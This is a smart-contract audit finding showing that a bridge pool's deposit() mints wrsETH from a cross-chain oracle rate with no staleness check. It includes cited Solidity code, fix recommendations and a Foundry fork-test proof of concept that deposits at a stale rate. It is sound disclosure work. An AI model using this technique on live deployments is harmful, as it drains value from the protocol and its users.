### Title
Stale Oracle Rate in `deposit()` Allows Over-Minting of wrsETH, Causing Protocol Insolvency — (`contracts/pools/RSETHPoolV2ExternalBridge.sol`)

---

### Summary

`RSETHPoolV2ExternalBridge.deposit()` mints wrsETH using a rate fetched from `CrossChainRateReceiver.getRate()`. That function returns the last stored `rate` with no staleness check. Because rsETH is a yield-bearing token whose ETH price grows monotonically, a stale (lower) rate causes every depositor to receive more wrsETH than the deposited ETH can back on L1, creating an unbounded insolvency gap.

---

### Finding Description

`CrossChainRateReceiver` stores both `rate` and `lastUpdated`, but `getRate()` returns `rate` unconditionally: [1](#0-0) [2](#0-1) 

The `IOracle` interface declared inside `RSETHPoolV2ExternalBridge` exposes only `getRate()` — there is no `lastUpdated()` surface: [3](#0-2) 

`viewSwapRsETHAmountAndFee()` uses this rate directly to compute the wrsETH amount: [4](#0-3) 

`deposit()` is callable by any address (no role gate), and applies no staleness guard before minting: [5](#0-4) 

The rate is updated only when a LayerZero message arrives via `lzReceive()`: [6](#0-5) 

If no message arrives for an extended period (network congestion, relayer downtime, provider inactivity), `rate` silently diverges from the true L1 rsETH/ETH price while `deposit()` continues to accept funds.

---

### Impact Explanation

rsETH accrues staking yield, so its ETH price increases over time. The mint formula is:

```
rsETHAmount = amountAfterFee * 1e18 / rsETHToETHrate
```

A stale (lower) `rsETHToETHrate` produces a larger `rsETHAmount`. Each depositor receives more wrsETH than the ETH they sent can purchase on L1. When those holders redeem on L1, the protocol must deliver more rsETH than the bridged ETH can buy, creating a direct insolvency gap. The gap compounds with every deposit made while the oracle is stale and grows unboundedly with time.

The `dailyMintLimit` caps the daily volume but does not prevent the per-unit over-issuance; it only limits the rate at which insolvency accumulates.

**Impact: Critical — Protocol insolvency.**

---

### Likelihood Explanation

- LayerZero message delivery is not guaranteed to be continuous; relayer downtime, gas exhaustion on the destination chain, or provider-side inactivity can all cause the oracle to go stale without any on-chain signal.
- No privileged action is required from the attacker; any user calling `deposit()` during a stale window is sufficient.
- The contract provides no circuit-breaker that automatically pauses deposits when the oracle has not been updated — the `PAUSER_ROLE` must act manually, which requires off-chain monitoring.

---

### Recommendation

1. **Add a staleness threshold in `CrossChainRateReceiver.getRate()`** — revert if `block.timestamp - lastUpdated > MAX_STALENESS`:

```solidity
uint256 public constant MAX_STALENESS = 24 hours;

function getRate() external view returns (uint256) {
    require(block.timestamp - lastUpdated <= MAX_STALENESS, "Rate is stale");
    return rate;
}
```

2. **Alternatively, expose `lastUpdated` through the `IOracle` interface** and check it inside `viewSwapRsETHAmountAndFee()` before computing the mint amount.

3. **Emit an event or revert in `deposit()`** if the oracle has not been updated within the acceptable window, so the pause mechanism can be triggered automatically via monitoring.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Fork test (e.g., Arbitrum/Optimism fork where the pool is deployed)
// Run with: forge test --fork-url <RPC> -vvvv

import "forge-std/Test.sol";

interface IPool {
    function deposit(string memory referralId) external payable;
    function viewSwapRsETHAmountAndFee(uint256 amount)
        external view returns (uint256 rsETHAmount, uint256 fee);
    function getRate() external view returns (uint256);
}

interface ICrossChainRateReceiver {
    function rate() external view returns (uint256);
    function lastUpdated() external view returns (uint256);
}

contract StaleOraclePoC is Test {
    IPool pool = IPool(<POOL_ADDRESS>);
    ICrossChainRateReceiver oracle = ICrossChainRateReceiver(<ORACLE_ADDRESS>);

    function testStaleOracleOverMint() external {
        // Record the rate at fork time (represents the "true" rate at that moment)
        uint256 rateAtFork = oracle.rate();

        // Advance time by 30 days without any oracle update
        vm.warp(block.timestamp + 30 days);

        // The oracle still returns the old rate — no staleness revert
        uint256 staleRate = pool.getRate();
        assertEq(staleRate, rateAtFork, "Rate should be unchanged (stale)");

        // Simulate the true current rate after 30 days of ~4% APY accrual
        // 4% APY / 365 * 30 ≈ 0.33% increase
        uint256 trueCurrentRate = rateAtFork * 10033 / 10000;

        // Compute wrsETH minted at stale rate vs. correct rate
        (uint256 wrsETHAtStaleRate,) = pool.viewSwapRsETHAmountAndFee(1 ether);
        uint256 correctWrsETH = (1 ether * 1e18) / trueCurrentRate;

        // Assert over-minting
        assertGt(wrsETHAtStaleRate, correctWrsETH, "Over-minting at stale rate");

        uint256 insolvencyPerEth = wrsETHAtStaleRate - correctWrsETH;
        emit log_named_uint("Over-minted wrsETH per 1 ETH (wei)", insolvencyPerEth);

        // Deposit 1 ETH — succeeds without revert despite stale oracle
        vm.deal(address(this), 1 ether);
        pool.deposit{value: 1 ether}("poc");
    }
}
```

The test demonstrates that after 30 days without an oracle update, `deposit()` succeeds and mints more wrsETH than the deposited ETH can back on L1, with the gap proportional to the elapsed time and the rsETH yield rate.

### Citations

**File:** contracts/cross-chain/CrossChainRateReceiver.sol (L13-14)
```text
    uint256 public rate;

```

**File:** contracts/cross-chain/CrossChainRateReceiver.sol (L82-99)
```text
    function lzReceive(uint16 _srcChainId, bytes memory _srcAddress, uint64, bytes calldata _payload) external {
        require(msg.sender == layerZeroEndpoint, "Sender should be lz endpoint");

        address srcAddress;
        assembly {
            srcAddress := mload(add(_srcAddress, 20))
        }

        require(_srcChainId == srcChainId, "Src chainId must be correct");
        require(srcAddress == rateProvider, "Src address must be provider");

        uint256 _rate = abi.decode(_payload, (uint256));

        rate = _rate;

        lastUpdated = block.timestamp;

        emit RateUpdated(_rate);
```

**File:** contracts/cross-chain/CrossChainRateReceiver.sol (L103-105)
```text
    function getRate() external view returns (uint256) {
        return rate;
    }
```

**File:** contracts/pools/RSETHPoolV2ExternalBridge.sol (L25-27)
```text
interface IOracle {
    function getRate() external view returns (uint256);
}
```

**File:** contracts/pools/RSETHPoolV2ExternalBridge.sol (L289-301)
```text
    function deposit(string memory referralId) external payable nonReentrant whenNotPaused limitDailyMint(msg.value) {
        uint256 amount = msg.value;

        if (amount == 0) revert InvalidAmount();

        (uint256 rsETHAmount, uint256 fee) = viewSwapRsETHAmountAndFee(amount);

        feeEarnedInETH += fee;

        wrsETH.mint(msg.sender, rsETHAmount);

        emit SwapOccurred(msg.sender, rsETHAmount, fee, referralId);
    }
```

**File:** contracts/pools/RSETHPoolV2ExternalBridge.sol (L307-316)
```text
    function viewSwapRsETHAmountAndFee(uint256 amount) public view returns (uint256 rsETHAmount, uint256 fee) {
        fee = amount * feeBps / 10_000;
        uint256 amountAfterFee = amount - fee;

        // rate of rsETH in ETH
        uint256 rsETHToETHrate = getRate();

        // Calculate the final rsETH amount
        rsETHAmount = amountAfterFee * 1e18 / rsETHToETHrate;
    }
```
